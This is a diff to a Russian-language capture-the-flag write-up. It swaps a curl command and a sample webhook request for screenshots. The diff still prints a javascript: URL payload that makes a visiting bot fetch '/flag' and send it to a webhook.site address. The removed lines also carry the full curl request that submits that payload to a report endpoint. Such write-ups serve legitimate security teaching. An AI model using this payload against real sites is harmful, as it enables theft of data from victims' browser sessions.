@@ -42,19 +42,12 @@ javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.si
 
 Итоговый запрос:
 
+<img width="1908" height="620" alt="image" src="https://github.com/user-attachments/assets/581dfc08-5e48-4c1b-9e08-8441c6b267bf" />
 
-```bash
-curl -i 'http://TARGET/report' \
-  -X POST \
-  -H 'Cookie: save=eyJ...' \
-  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/WEBHOOK_ID/?flag='+encodeURIComponent(f))"
-```
 
 После визита бота на webhook приходит запрос вида:
+<img width="1069" height="393" alt="image" src="https://github.com/user-attachments/assets/c2a9ea99-7a48-4106-adb0-6f3637c60e99" />
 
-```text
-https://webhook.site/WEBHOOK_ID/?flag=dice%7B...
-```
 
 Из него и достаётся флаг:
 
